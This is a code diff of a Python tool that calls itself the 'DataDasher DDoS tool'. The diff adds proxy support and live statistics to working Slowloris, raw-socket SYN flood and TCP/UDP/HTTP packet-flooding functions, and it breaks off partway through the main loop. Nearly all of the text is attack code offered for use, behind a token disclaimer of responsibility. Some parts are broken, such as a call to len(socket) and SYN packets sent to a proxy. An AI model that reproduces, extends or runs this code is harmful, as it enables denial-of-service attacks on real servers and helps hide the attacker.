@@ -7,7 +7,7 @@ import re
 import json
 from rich.console import Console
 from rich.prompt import Prompt, Confirm
-from rich.progress import track
+from rich.progress import Progress, track
 from rich.table import Table
 from prompt_toolkit import PromptSession
 from prompt_toolkit.history import FileHistory
@@ -19,6 +19,8 @@ import string
 import os
 import sys
 import struct
+from rich.live import Live
+from rich.panel import Panel
 
 logging.basicConfig(filename='packet_sender.log', level=logging.INFO,
                     format='%(asctime)s - %(levelname)s - %(message)s')
@@ -26,6 +28,12 @@ console = Console()
 
 total_packets_sent = 0
 total_packets_failed = 0
+
+# Global variables for visualization
+attack_start_time = 0
+sent_packets_history = []
+failed_packets_history = []
+response_times = []
 
 
 def validate_ip(ip):
@@ -47,7 +55,8 @@ _  /_/ // /_/ // /_ / /_/ /_  /_/ // /_/ /_(__  )_  / / /  __/  /
 
                                                                  [/bold red]""", style="bold yellow")
     console.print("[bold red]DataDasher DDoS tool v1.0.0 - Created by @LifelagCheats[/bold red]\n")
-    console.print("[bold red]I am not responsible for any illegal activities, misuse or damage caused by this tool.[/bold red]")
+    console.print(
+        "[bold red]I am not responsible for any illegal activities, misuse or damage caused by this tool.[/bold red]")
     console.print("[bold red]Type 'help' for help and usage instructions.[/bold red]\n")
 
 
@@ -55,21 +64,36 @@ def log_packet_action(action):
     logging.info(action)
 
 
-def send_tcp_packet(server_ip, server_port, payload, custom_headers=None):
-    global total_packets_sent, total_packets_failed
+def send_tcp_packet(server_ip, server_port, payload, custom_headers=None, proxy_server=None, proxy_port=None):
+    global total_packets_sent, total_packets_failed, response_times
     try:
-        tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        tcp_socket.settimeout(2)
-        tcp_socket.connect((server_ip, server_port))
+        if proxy_server and proxy_port:
+            tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            tcp_socket.connect((proxy_server, proxy_port))
+            connect_request = f"CONNECT {server_ip}:{server_port} HTTP/1.1\r\nHost: {server_ip}:{server_port}\r\n\r\n"
+            tcp_socket.sendall(connect_request.encode())
+            response = tcp_socket.recv(1024).decode()
+            if "200 Connection established" not in response:
+                raise Exception(f"Proxy connection failed: {response}")
+        else:
+            tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            tcp_socket.settimeout(2)
+            tcp_socket.connect((server_ip, server_port))
+
+        start_time = time.time()
         if custom_headers:
             for header, value in custom_headers.items():
                 tcp_socket.sendall(f"{header}: {value}\r\n".encode())
         tcp_socket.sendall(payload.encode())
+        end_time = time.time()
+        response_times.append(end_time - start_time)
+
         log_packet_action(
             f"TCP Packet sent to {server_ip}:{server_port} - Payload: {payload} - Headers: {custom_headers}")
         console.print(f"[green]TCP Packet sent to {server_ip}:{server_port}[/green]")
         total_packets_sent += 1
         tcp_socket.close()
+        return True
     except socket.timeout:
         console.print(f"[red]Error: Connection to {server_ip}:{server_port} timed out.[/red]")
         log_packet_action(f"Error: Connection to {server_ip}:{server_port} timed out.")
@@ -82,18 +106,25 @@ def send_tcp_packet(server_ip, server_port, payload, custom_headers=None):
         console.print(f"[red]Error sending TCP packet: {e}[/red]")
         log_packet_action(f"Error sending TCP packet to {server_ip}:{server_port} - {e}")
         total_packets_failed += 1
+    return False
 
 
-def send_udp_packet(server_ip, server_port, payload, custom_headers=None):
-    global total_packets_sent, total_packets_failed
+def send_udp_packet(server_ip, server_port, payload, custom_headers=None, proxy_server=None, proxy_port=None):
+    global total_packets_sent, total_packets_failed, response_times
     try:
-        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        udp_socket.settimeout(2)
-        udp_socket.sendto(payload.encode(), (server_ip, server_port))
+        if proxy_server and proxy_port:
+            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            udp_socket.connect((proxy_server, proxy_port))
+            udp_socket.sendto(payload.encode(), (server_ip, server_port))
+        else:
+            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            udp_socket.settimeout(2)
+            udp_socket.sendto(payload.encode(), (server_ip, server_port))
         log_packet_action(f"UDP Packet sent to {server_ip}:{server_port} - Payload: {payload}")
         console.print(f"[green]UDP Packet sent to {server_ip}:{server_port}[/green]")
         total_packets_sent += 1
         udp_socket.close()
+        return True
     except socket.timeout:
         console.print(f"[red]Error: UDP packet timed out. Could not reach {server_ip}:{server_port}[/red]")
         log_packet_action(f"Error: UDP packet timed out. Could not reach {server_ip}:{server_port}")
@@ -102,15 +133,26 @@ def send_udp_packet(server_ip, server_port, payload, custom_headers=None):
         console.print(f"[red]Error sending UDP packet: {e}[/red]")
         log_packet_action(f"Error sending UDP packet to {server_ip}:{server_port} - {e}")
         total_packets_failed += 1
+    return False
 
 
-def http_get_request(url):
-    global total_packets_sent, total_packets_failed
+def http_get_request(url, custom_headers=None, proxy_server=None, proxy_port=None):
+    global total_packets_sent, total_packets_failed, response_times
     try:
-        response = requests.get(url, timeout=2)
+        proxies = None
+        if proxy_server and proxy_port:
+            proxies = {
+                'http': f'http://{proxy_server}:{proxy_port}',
+                'https': f'http://{proxy_server}:{proxy_port}'
+            }
+        start_time = time.time()
+        response = requests.get(url, headers=custom_headers, proxies=proxies, timeout=2)
+        end_time = time.time()
+        response_times.append(end_time - start_time)
         log_packet_action(f"HTTP GET request sent to {url} - Status Code: {response.status_code}")
         console.print(f"[green]HTTP GET request sent to {url} - Status Code: {response.status_code}[/green]")
         total_packets_sent += 1
+        return True
     except requests.exceptions.Timeout:
         console.print(f"[red]Error: Timeout - HTTP GET request to {url} timed out.[/red]")
         log_packet_action(f"Error: Timeout - HTTP GET request to {url} timed out.")
@@ -119,6 +161,7 @@ def http_get_request(url):
         console.print(f"[red]Error sending HTTP GET request: {e}[/red]")
         log_packet_action(f"Error sending HTTP GET request to {url} - {e}")
         total_packets_failed += 1
+    return False  # Indicate failure
 
 
 def statistics_display():
@@ -160,6 +203,7 @@ def display_help(command=None):
         console.print("  -p, --payload <payload>  Specify the packet payload (default: 'Hello, World!')")
         console.print("  -c, --count <count>    Number of packets to send (default: 1)")
         console.print("  -r, --rate <rate>      Packets per second (default: 1)")
+        console.print("  -px, --proxy <proxy>    Specify a proxy server to use (e.g., 127.0.0.1:8080)")
         console.print(
             "  -h, --headers <json>   Custom headers in JSON format (e.g., '{\"header\": \"value\"}')")
     elif command == 'stats':
@@ -190,12 +234,14 @@ def display_help(command=None):
             "  -t, --timeout <timeout> Timeout in seconds before refreshing connections (default: 60)"
         )
         console.print("  -p, --payload <payload> Specify initial HTTP request (default: GET)")
+        console.print("  -px, --proxy <proxy>    Specify a proxy server to use (e.g., 127.0.0.1:8080)")
     elif command == "synflood":
         console.print("[bold blue]synflood[/] - Perform a SYN flood attack.")
         console.print("Usage: synflood <target> <port> [options]")
         console.print("Options:")
         console.print("  -c, --count <count> Number of SYN packets to send (default: 1000)")
         console.print("  -r, --rate <rate> Packets per second to send (default: 100)")
+        console.print("  -px, --proxy <proxy>    Specify a proxy server to use (e.g., 127.0.0.1:8080)")
     else:
         console.print("[bold blue]Available commands:[/]")
         console.print("  [bold blue]send[/]     - Send packets to a target.")
@@ -255,412 +301,477 @@ def load_config(file_path):
         return None
 
 
-def slowloris_attack(target_ip, target_port, count=500, rate=5, payload="GET / HTTP/1.1\r\nHost: {target}\r\n\r\n",
-                     timeout=60):
-    global total_packets_sent, total_packets_failed
+def slowloris_attack(target_ip, target_port, count=500, rate=5,
+                     payload="GET / HTTP/1.1\r\nHost: {target}\r\n\r\n", timeout=60,
+                     proxy_server=None, proxy_port=None):
+    global total_packets_sent, total_packets_failed, attack_start_time
     sockets = []
-    for _ in track(range(count), description="[red]Opening Slowloris connections..."):
+    attack_start_time = time.time()
+
+    with Live(update_attack_stats("slowloris", 0), refresh_per_second=4) as live:
+        for _ in range(count):
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                if proxy_server and proxy_port:
+                    sock.connect((proxy_server, proxy_port))
+                    connect_request = f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\n\r\n"
+                    sock.sendall(connect_request.encode())
+                    response = sock.recv(1024).decode()
+                    if "200 Connection established" not in response:
+                        raise Exception(f"Proxy connection failed: {response}")
+                else:
+                    sock.connect((target_ip, target_port))
+                payload = payload.format(target=target_ip)
+                sock.sendall(payload.encode())
+                sockets.append(sock)
+                total_packets_sent += 1
+                time.sleep(1 / rate)
+
+                elapsed_time = time.time() - attack_start_time
+                live.update(update_attack_stats("slowloris", elapsed_time))
+
+            except Exception as e:
+                console.print(f"[red]Error opening Slowloris connection: {e}[/red]")
+                total_packets_failed += 1
+
+        console.print(f"[yellow]Opened {len(sockets)} Slowloris connections.[/yellow]")
+        console.print("[yellow]Keeping connections open... (Press Ctrl+C to interrupt)[/yellow]")
+
+        start_time = time.time()
+
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((target_ip, target_port))
-            payload = payload.format(target=target_ip)
-            sock.sendall(payload.encode())
-            sockets.append(sock)
-            total_packets_sent += 1
-            time.sleep(1 / rate)
-        except Exception as e:
-            console.print(f"[red]Error opening Slowloris connection: {e}[/red]")
-            total_packets_failed += 1
-    console.print(f"[yellow]Opened {len(sockets)} Slowloris connections.[/yellow]")
-    console.print("[yellow]Keeping connections open... (Press Ctrl+C to interrupt)[/yellow]")
-    start_time = time.time()
-    try:
-        while True:
-            if time.time() - start_time > timeout:
-                start_time = time.time()
-                console.print("[yellow]Closing inactive connections and opening new ones.[/yellow]")
+            while True:
+                if time.time() - start_time > timeout:
+                    start_time = time.time()
+                    console.print("[yellow]Closing inactive connections and opening new ones.[/yellow]")
+                    for sock in sockets:
+                        try:
+                            sock.close()
+                        except Exception as e:
+                            console.print(f"[red]Error closing connection: {e}[/red]")
+                    sockets = []
+                    for _ in range(count):
+                        try:
+                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            if proxy_server and proxy_port:
+                                sock.connect((proxy_server, proxy_port))
+                                connect_request = f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\n\r\n"
+                                sock.sendall(connect_request.encode())
+                                response = sock.recv(1024).decode()
+                                if "200 Connection established" not in response:
+                                    raise Exception(f"Proxy connection failed: {response}")
+                            else:
+                                sock.connect((target_ip, target_port))
+                            payload = payload.format(target=target_ip)
+                            sock.sendall(payload.encode())
+                            sockets.append(sock)
+                            total_packets_sent += 1
+                            time.sleep(1 / rate)
+                        except Exception as e:
+                            console.print(f"[red]Error opening Slowloris connection: {e}[/red]")
+                            total_packets_failed += 1
                 for sock in sockets:
                     try:
-                        sock.close()
+                        for _ in range(random.randint(1, 5)):
+                            sock.sendall(
+                                f"X-{random.choice(string.ascii_letters)}: {random.randint(1, 5000)}\r\n".encode())
+                            total_packets_sent += 1
+
+                        elapsed_time = time.time() - attack_start_time
+                        live.update(update_attack_stats("slowloris", elapsed_time))
+                        time.sleep(rate)
                     except Exception as e:
-                        console.print(f"[red]Error closing connection: {e}[/red]")
-                sockets = []
-                for _ in track(range(count), description="[red]Opening Slowloris connections..."):
-                    try:
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.connect((target_ip, target_port))
-                        payload = payload.format(target=target_ip)
-                        sock.sendall(payload.encode())
-                        sockets.append(sock)
-                        total_packets_sent += 1
-                        time.sleep(1 / rate)
-                    except Exception as e:
-                        console.print(f"[red]Error opening Slowloris connection: {e}[/red]")
+                        console.print(f"[red]Error sending data to keep connection alive: {e}[/red]")
                         total_packets_failed += 1
+
+        except KeyboardInterrupt:
+            console.print("\n[yellow]Interrupting Slowloris attack. Closing connections.[/yellow]")
             for sock in sockets:
-                try:
-                    for _ in range(random.randint(1, 5)):
-                        sock.sendall(f"X-{random.choice(string.ascii_letters)}: {random.randint(1, 5000)}\r\n".encode())
-                        total_packets_sent += 1
-                    time.sleep(rate)
-                except Exception as e:
-                    console.print(f"[red]Error sending data to keep connection alive: {e}[/red]")
-                    total_packets_failed += 1
-    except KeyboardInterrupt:
-        console.print("\n[yellow]Interrupting Slowloris attack. Closing connections.[/yellow]")
-        for sock in sockets:
-            sock.close()
+                sock.close()
 
 
-def syn_flood_attack(target_ip, target_port, count=1000, rate=100):
-    global total_packets_sent, total_packets_failed
+def syn_flood_attack(target_ip, target_port, count=1000, rate=100, proxy_server=None, proxy_port=None):
+    global total_packets_sent, total_packets_failed, attack_start_time
     console.print(f"[red]WARNING: Performing SYN Flood attack!  Use extreme caution![/red]")
-    for _ in track(range(count), description="[red]Sending SYN packets..."):
+    attack_start_time = time.time()
+
+    with Live(update_attack_stats("synflood", 0), refresh_per_second=4) as live:
+        for i in range(count):
+            try:
+                ip_header = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 0, 0, 0, 0x40, 0, 0,
+                                        socket.inet_aton(socket.gethostbyname(socket.gethostname())),
+                                        socket.inet_aton(target_ip))
+                tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024, 65535), target_port, 0, 0, 0x02,
+                                         0, 0, 0, 0)
+                source_ip = socket.inet_aton(socket.gethostbyname(socket.gethostname()))
+                pseudo_header = source_ip + socket.inet_aton(target_ip) + b"\x00" + b"\x06" + struct.pack("!H",
+                                                                                                          len(tcp_header))
+                packet = ip_header + tcp_header
+                if proxy_server and proxy_port:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                    s.sendto(packet, (proxy_server, proxy_port))
+                    s.close()
+                else:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                    s.sendto(packet, (target_ip, target_port))
+                    s.close()
+                total_packets_sent += 1
+
+                if i % 10 == 0:
+                    elapsed_time = time.time() - attack_start_time
+                    live.update(update_attack_stats("synflood", elapsed_time))
+
+                time.sleep(1 / rate)
+            except Exception as e:
+                console.print(f"[red]Error sending SYN packet: {e}[/red]")
+                total_packets_failed += 1
+                break
+
+
+def is_target_responsive(target_ip, target_port, protocol="TCP", retries=3, delay=1):
+    """Check if the target is responsive, with retries and delay."""
+    for attempt in range(retries):
         try:
-            ip_header = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 0, 0, 0, 0x40, 0, 0,
-                                    socket.inet_aton(socket.gethostbyname(socket.gethostname())),
-                                    socket.inet_aton(target_ip))
-            tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024, 65535), target_port, 0, 0, 0x02,
-                                     0, 0, 0, 0)
-            source_ip = socket.inet_aton(socket.gethostbyname(socket.gethostname()))
-            pseudo_header = source_ip + socket.inet_aton(target_ip) + b"\x00" + b"\x06" + struct.pack("!H",
-                                                                                                      len(tcp_header))
-            packet = ip_header + tcp_header
-            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-            s.sendto(packet, (target_ip, target_port))
-            s.close()
-            total_packets_sent += 1
-            time.sleep(1 / rate)
-        except Exception as e:
-            console.print(f"[red]Error sending SYN packet: {e}[/red]")
-            total_packets_failed += 1
+            if protocol == "TCP":
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                sock.connect((target_ip, target_port))
+                sock.close()
+            elif protocol == "UDP":
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.settimeout(2)
+                sock.sendto(b"test", (target_ip, target_port))
+                sock.close()
+            elif protocol == "HTTP GET":
+                response = requests.get(f"http://{target_ip}:{target_port}/", timeout=2)
+                if response.status_code == 200:
+                    return True
+            return True  # If connection or request succeeded
+        except (socket.timeout, ConnectionRefusedError, requests.exceptions.RequestException) as e:
+            console.print(f"[yellow]Attempt {attempt + 1}/{retries}: Target not responsive: {e}[/yellow]")
+            time.sleep(delay)
+    return False
+
+
+def update_attack_stats(attack_type, elapsed_time):
+    """Update the attack statistics tables and graphs."""
+    global sent_packets_history, failed_packets_history, attack_start_time
+    if attack_type == 'send':
+        sent_packets_history.append(total_packets_sent)
+        failed_packets_history.append(total_packets_failed)
+        table = Table(title=f"Attack Statistics (Elapsed Time: {elapsed_time:.2f} seconds)", expand=True)
+        table.add_column("Packets Sent", style="green", no_wrap=True)
+        table.add_column("Packets Failed", style="red", no_wrap=True)
+        table.add_row(str(total_packets_sent), str(total_packets_failed))
+    elif attack_type == 'slowloris':
+        sent_packets_history.append(total_packets_sent - sum(sent_packets_history))
+        failed_packets_history.append(
+            total_packets_failed - sum(failed_packets_history))
+        table = Table(title=f"Slowloris Statistics (Elapsed Time: {elapsed_time:.2f} seconds)", expand=True)
+        table.add_column("Active Connections", style="cyan", no_wrap=True)
+        table.add_column("Packets Sent (Interval)", style="green", no_wrap=True)
+        table.add_column("Packets Failed (Interval)", style="red", no_wrap=True)
+        table.add_row(str(len(socket)), str(sent_packets_history[-1]), str(failed_packets_history[-1]))
+
+    elif attack_type == 'synflood':
+        sent_packets_history.append(total_packets_sent)
+        failed_packets_history.append(total_packets_failed)
+        table = Table(title=f"SYN Flood Statistics (Elapsed Time: {elapsed_time:.2f} seconds)", expand=True)
+        table.add_column("Packets Sent", style="green", no_wrap=True)
+        table.add_column("Packets Failed", style="red", no_wrap=True)
+        table.add_row(str(total_packets_sent), str(total_packets_failed))
+    return table
+
+
+def attack_visualizations(elapsed_time):
+    """Display tables and graphs for attack statistics."""
+    global sent_packets_history, failed_packets_history, response_times
+    grid = Table.grid(expand=True)
+    grid.add_column(justify="center", ratio=1)
+    grid.add_column(justify="right", ratio=2)
+    if response_times:
+        avg_response_time = sum(response_times) / len(response_times) if response_times else 0
+        response_time_panel = Panel(
+            f"Average Response Time: {avg_response_time:.2f} seconds",
+            title="Response Time",
+            expand=False,
+        )
+        grid.add_row(response_time_panel)
+    console.print(grid)
 
 
 def main():
-    global total_packets_sent, total_packets_failed
-    parser = argparse.ArgumentParser(description='Your Network Tool Description')
-    subparsers = parser.add_subparsers(dest='command', help='Available commands')
-    send_parser = subparsers.add_parser('send', help='Send packets.')
-    send_parser.add_argument('protocol', choices=['TCP', 'UDP', 'HTTP GET'], help='Protocol to use.')
-    send_parser.add_argument('target', help='Target IP address or domain name.')
-    send_parser.add_argument('port', type=int, nargs='?', help='Target port number (required for TCP/UDP).')
-    send_parser.add_argument('-p', '--payload', default='Hello, World!', help='Payload to send.')
-    send_parser.add_argument('-c', '--count', type=int, default=1, help='Number of packets to send.')
-    send_parser.add_argument('-r', '--rate', type=int, default=1, help='Packets per second.')
-    send_parser.add_argument('-f', '--file', metavar='FILE', help='Load payload from file.')
-    stats_parser = subparsers.add_parser('stats', help='Display statistics.')
-    help_parser = subparsers.add_parser('help', help='Show help message.')
-    save_parser = subparsers.add_parser("save", help="Save the current config.")
-    save_parser.add_argument("config_name", type=str, help="Name of the config file.")
-    load_parser = subparsers.add_parser("load", help="Load a config file.")
-    load_parser.add_argument("config_name", type=str, help="Name of the config file.")
-    slowloris_parser = subparsers.add_parser("slowloris", help="Initiate a Slowloris attack.")
-    slowloris_parser.add_argument("target", help="Target IP address or domain name.")
-    slowloris_parser.add_argument("port", type=int, help="Target port number.")
-    slowloris_parser.add_argument('-c', '--count', type=int, default=500, help="Number of connections to establish.")
-    slowloris_parser.add_argument('-r', '--rate', type=int, default=5,
-                                  help="Delay in seconds between sending headers.")
-    slowloris_parser.add_argument('-t', '--timeout', type=int, default=60,
-                                  help="Timeout in seconds before refreshing connections.")
-    slowloris_parser.add_argument('-p', '--payload',
-                                  default="GET / HTTP/1.1\r\nHost: {target}\r\n\r\n",
-                                  help="Initial part of the HTTP request.")
-    synflood_parser = subparsers.add_parser("synflood", help="Perform a SYN flood attack.")
-    synflood_parser.add_argument("target", help="Target IP address or domain name.")
-    synflood_parser.add_argument("port", type=int, help="Target port number.")
-    synflood_parser.add_argument('-c', '--count', type=int, default=1000, help="Number of SYN packets to send.")
-    synflood_parser.add_argument('-r', '--rate', type=int, default=100, help="Packets per second to send.")
-    if len(sys.argv) > 1:
-        args = parser.parse_args()
-        if args.command == 'send':
-            if args.protocol in ('TCP', 'UDP') and args.port is None:
-                console.print("[red]Error: Port number is required for TCP and UDP protocols.[/red]")
-                sys.exit(1)
-            if args.payload.startswith("random:"):
-                try:
-                    payload_length = int(args.payload.split("random:")[1])
-                    args.payload = generate_random_payload(payload_length)
-                except Exception as e:
-                    console.print(f"[red]Error parsing 'random' payload length: {e}[/red]")
-                    sys.exit(1)
-            elif args.payload.startswith("file:"):
-                try:
-                    file_path = args.payload.split("file:")[1]
-                    args.payload = load_payload_from_file(file_path)
-                    if args.payload is None:
-                        sys.exit(1)
-                except Exception as e:
-                    console.print(f"[red]Error parsing 'file' payload path: {e}[/red]")
-                    sys.exit(1)
-            if not validate_ip(args.target):
-                target_ip = get_target_ip(args.target)
-                if target_ip is None:
-                    sys.exit(1)
-                args.target = target_ip
-            for _ in track(range(args.count), description="Sending packets..."):
-                if args.protocol == 'TCP':
-                    send_tcp_packet(args.target, args.port, args.payload)
-                elif args.protocol == 'UDP':
-                    send_udp_packet(args.target, args.port, args.payload)
-                elif args.protocol == 'HTTP GET':
-                    http_get_request(args.target)
-                time.sleep(1 / args.rate)
-        elif args.command == 'stats':
-            statistics_display()
-        elif args.command == 'help':
-            display_help()
-        elif args.command == 'slowloris':
-            if not validate_ip(args.target):
-                target_ip = get_target_ip(args.target)
-                if target_ip is None:
-                    sys.exit(1)
-                args.target = target_ip
-            slowloris_attack(args.target, args.port, args.count, args.rate, args.payload,
-                             args.timeout)
-        elif args.command == 'synflood':
-            if not validate_ip(args.target):
-                target_ip = get_target_ip(args.target)
-                if target_ip is None:
-                    sys.exit(1)
-                args.target = target_ip
-            syn_flood_attack(args.target, args.port, args.count, args.rate)
-        elif args.command == 'save':
-            config = {
-                "default_protocol": args.protocol,
-                "default_target": args.target,
-                "default_port": args.port
-            }
-            save_config(config, args.config_name)
-        elif args.command == 'load':
-            config = load_config(args.config_name)
-            if config is None:
-                sys.exit(1)
-            args.protocol = config.get("default_protocol", args.protocol)
-            args.target = config.get("default_target", args.target)
-            args.port = config.get("default_port", args.port)
-    else:
-        display_title()
-        session = PromptSession(
-            history=FileHistory('packet_sender_history.txt'),
-            completer=WordCompleter(
-                ['send', 'stats', 'clear', 'help', 'save', 'load', 'slowloris', 'synflood', 'exit'],
-                ignore_case=True),
-        )
-        while True:
-            try:
-                command = session.prompt('> ')
-                if command:
-                    args = command.split()
-                    cmd = args[0].lower()
-                    if cmd == 'send':
-                        if len(args) < 4:
-                            console.print(
-                                "[red]Error: Invalid usage. Type 'help send' for correct usage.[/red]")
-                            continue
-                        protocol = args[1].upper()
-                        target = args[2]
-                        try:
-                            port = int(args[3])
-                        except ValueError:
-                            console.print("[red]Error: Invalid port number.[/red]")
-                            continue
-                        payload = 'Hello, World!'
-                        count = 1
-                        rate = 1
-                        custom_headers = {}
-                        i = 4
-                        while i < len(args):
-                            if args[i] in ('-p', '--payload') and i < len(args) - 1:
-                                payload = args[i + 1]
-                                i += 2
-                            elif args[i] in ('-c', '--count') and i < len(args) - 1:
-                                try:
-                                    count = int(args[i + 1])
-                                except ValueError:
-                                    console.print("[red]Error: Invalid count value.[/red]")
-                                    break
-                                i += 2
-                            elif args[i] in ('-r', '--rate') and i < len(args) - 1:
-                                try:
-                                    rate = int(args[i + 1])
-                                except ValueError:
-                                    console.print("[red]Error: Invalid rate value.[/red]")
-                                    break
-                                i += 2
-                            elif args[i] in ('-h', '--headers') and i < len(args) - 1:
-                                try:
-                                    custom_headers = json.loads(args[i + 1])
-                                except json.JSONDecodeError:
-                                    console.print("[red]Error: Invalid JSON format for headers.[/red]")
-                                    break
-                                i += 2
-                            else:
-                                console.print(f"[red]Error: Unknown option '{args[i]}'.[/red]")
+    global total_packets_sent, total_packets_failed, attack_start_time
+    display_title()
+    session = PromptSession(
+        history=FileHistory('packet_sender_history.txt'),
+        completer=WordCompleter(
+            ['send', 'stats', 'clear', 'help', 'save', 'load', 'slowloris', 'synflood', 'exit'],
+            ignore_case=True),
+    )
+    while True:
+        try:
+            command = session.prompt('> ')
+            if command:
+                args = command.split()
+                cmd = args[0].lower()
+                if cmd == 'send':
+                    if len(args) < 4:
+                        console.print("[red]Error: Invalid usage. Type 'help send' for correct usage.[/red]")
+                        continue
+
+                    protocol = args[1].upper()
+                    target = args[2]
+
+                    try:
+                        port = int(args[3])
+                    except ValueError:
+                        console.print("[red]Error: Invalid port number.[/red]")
+                        continue
+
+                    payload = 'Hello, World!'
+                    count = 1
+                    rate = 1
+                    custom_headers = {}
+                    proxy_server = None
+                    proxy_port = None
+
+                    i = 4
+                    while i < len(args):
+                        if args[i] in ('-p', '--payload') and i < len(args) - 1:
+                            payload = args[i + 1]
+                            i += 2
+                        elif args[i] in ('-c', '--count') and i < len(args) - 1:
+                            try:
+                                count = int(args[i + 1])
+                            except ValueError:
+                                console.print("[red]Error: Invalid count value.[/red]")
                                 break
-                        if protocol == "TCP":
-                            for _ in track(range(count), description="Sending packets..."):
-                                send_tcp_packet(target, port, payload, custom_headers)
-                                time.sleep(1 / rate)
-                        elif protocol == "UDP":
-                            for _ in track(range(count), description="Sending packets..."):
-                                send_udp_packet(target, port, payload, custom_headers)
-                                time.sleep(1 / rate)
-                        elif protocol == "HTTP GET":
-                            for _ in track(range(count), description="Sending requests..."):
-                                http_get_request(target)
-                                time.sleep(1 / rate)
+                            i += 2
+                        elif args[i] in ('-r', '--rate') and i < len(args) - 1:
+                            try:
+                                rate = int(args[i + 1])
+                            except ValueError:
+                                console.print("[red]Error: Invalid rate value.[/red]")
+                                break
+                            i += 2
+                        elif args[i] in ('-hd', '--headers') and i < len(args) - 1:
+                            try:
+                                custom_headers = json.loads(args[i + 1])
+                            except json.JSONDecodeError:
+                                console.print("[red]Error: Invalid JSON format for headers.[/red]")
+                                break
+                            i += 2
+                        elif args[i] in ('-px', '--proxy') and i < len(args) - 1:
+                            try:
+                                proxy_server, proxy_port = args[i + 1].split(":")
+                                proxy_port = int(proxy_port)
+                                i += 2
+                            except Exception as e:
+                                console.print(f"[red]Error parsing proxy: {e}[/red]")
+                                break
                         else:
-                            console.print(
-                                f"[red]Error: Invalid protocol '{protocol}'. Choose from TCP, UDP, or HTTP GET.[/red]"
-                            )
-                    elif cmd == 'stats':
-                        statistics_display()
-                    elif cmd == 'clear':
-                        console.clear()
-                        display_title()
-                    elif cmd == 'help':
-                        if len(args) > 1:
-                            display_help(args[1].lower())
-                        else:
-                            display_help()
-                    elif cmd == 'save':
-                        if len(args) < 2:
-                            console.print("[red]Error: Provide a file path to save the configuration.[/red]")
-                            continue
-                        config_file = args[1]
+                            console.print(f"[red]Error: Unknown option '{args[i]}'.[/red]")
+                            break
 
-                        # Get current settings (replace these with your actual setting variables):
-                        config = {
-                            "default_protocol": args.protocol,
-                            "default_target": args.target,
-                            "default_port": args.port
-                            # ... add other settings
-                        }
-
-                        save_config(config, config_file)
-                    elif cmd == 'load':
-                        if len(args) < 2:
-                            console.print("[red]Error: Provide a file path to load the configuration.[/red]")
-                            continue
-                        config_file = args[1]
-                        config = load_config(config_file)
-                        if config is None:
-                            continue
-                    elif cmd == 'slowloris':
-                        if len(args) < 3:
-                            console.print(
-                                "[red]Error: Invalid usage. Type 'help slowloris' for correct usage.[/red]")
-                            continue
-                        target = args[1]
-                        try:
-                            port = int(args[2])
-                        except ValueError:
-                            console.print("[red]Error: Invalid port number.[/red]")
-                            continue
-
-                        # Default values
-                        count = 500
-                        rate = 5
-                        timeout = 60
-                        payload = "GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"
-
-                        # Parse additional arguments for slowloris
-                        i = 3
-                        while i < len(args):
-                            if args[i] in ("-c", "--count") and i < len(args) - 1:
-                                try:
-                                    count = int(args[i + 1])
-                                except ValueError:
-                                    console.print("[red]Error: Invalid count value.[/red]")
-                                    break
-                                i += 2
-                            elif args[i] in ("-r", "--rate") and i < len(args) - 1:
-                                try:
-                                    rate = int(args[i + 1])
-                                except ValueError:
-                                    console.print("[red]Error: Invalid rate value.[/red]")
-                                    break
-                                i += 2
-                            elif args[i] in ("-t", "--timeout") and i < len(args) - 1:
-                                try:
-                                    timeout = int(args[i + 1])
-                                except ValueError:
-                                    console.print("[red]Error: Invalid timeout value.[/red]")
-                                    break
-                                i += 2
-                            elif args[i] in ("-p", "--payload") and i < len(args) - 1:
-                                payload = args[i + 1]
-                                i += 2
-                            else:
-                                console.print(f"[red]Error: Unknown option '{args[i]}' for slowloris.[/red]")
-                                break
-                        if not validate_ip(target):
-                            target_ip = get_target_ip(target)
-                            if target_ip is None:
-                                continue
-                            target = target_ip  # Update target with resolved IP
-
-                        slowloris_attack(target, port, count, rate, payload, timeout)
-                    elif cmd == 'synflood':
-                        if len(args) < 3:
-                            console.print(
-                                "[red]Error: Invalid usage. Type 'help synflood' for correct usage.[/red]")
-                            continue
-                        target = args[1]
-                        try:
-                            port = int(args[2])
-                        except ValueError:
-                            console.print("[red]Error: Invalid port number.[/red]")
-                            continue
-
-                        # Default values
-                        count = 1000
-                        rate = 100
-
-                        # Parse additional arguments for synflood
-                        i = 3
-                        while i < len(args):
-                            if args[i] in ("-c", "--count") and i < len(args) - 1:
-                                try:
-                                    count = int(args[i + 1])
-                                except ValueError:
-                                    console.print("[red]Error: Invalid count value.[/red]")
-                                    break
-                                i += 2
-                            elif args[i] in ("-r", "--rate") and i < len(args) - 1:
-                                try:
-                                    rate = int(args[i + 1])
-                                except ValueError:
-                                    console.print("[red]Error: Invalid rate value.[/red]")
-                                    break
